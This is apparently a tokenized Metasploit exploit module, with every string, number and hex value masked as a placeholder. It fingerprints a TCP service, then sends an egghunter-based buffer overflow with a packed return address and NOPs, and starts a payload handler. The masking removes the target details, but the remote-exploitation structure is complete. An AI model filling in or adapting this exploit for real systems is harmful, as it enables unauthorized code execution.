require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: Tcp include Msf :: Exploit :: Egghunter def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , } , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > - <int> , } , <str> = > [ [ <str> , { <str> = > <hex> , <str> = > <int> , } ] , [ <str> , { <str> = > <hex> , <str> = > <int> , } ] , [ <str> , { <str> = > <hex> , <str> = > <int> , } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self . class ) end def check connect res = sock . get_once ( - <int> , <int> ) vprint_status ( <str> res . to_s . chop <str> ) sock . puts ( <str> ) res = sock . get_once ( - <int> , <int> ) vprint_status ( <str> res . to_s . chop <str> ) disconnect if res =~ <str> return Exploit :: CheckCode :: Detected end return Exploit :: CheckCode :: Safe end def exploit eggoptions = { <str> = > true , <str> = > <str> } hunter , egg = generate_egghunter ( payload . encoded , payload_badchars , eggoptions ) buffer = rand_text ( target [ <str> ] ) buffer << [ target . ret ] . pack ( <str> ) buffer << hunter buffer << make_nops ( <int> ) vprint_status ( <str> % egg . length + Rex :: Text . to_hex_dump ( egg ) ) vprint_status ( <str> % hunter . length + Rex :: Text . to_hex_dump ( hunter ) ) vprint_status ( <str> % buffer . length + Rex :: Text . to_hex_dump ( buffer ) ) print_status ( <str> target . name <str> ) connect print_status ( <str> ) sock . put ( egg ) connect print_status ( <str> ) sock . put ( buffer ) handler disconnect end end 
